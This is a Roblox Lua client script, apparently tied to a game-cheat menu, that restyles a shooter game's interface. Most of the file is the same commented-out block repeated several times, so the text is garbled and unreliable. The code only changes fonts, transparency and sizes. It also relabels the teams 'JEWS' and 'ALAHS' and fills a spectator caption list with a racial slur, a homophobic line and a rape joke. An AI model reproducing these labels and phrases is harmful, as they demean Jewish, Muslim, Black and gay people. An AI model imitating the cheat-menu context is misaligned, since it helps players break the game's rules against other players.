	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
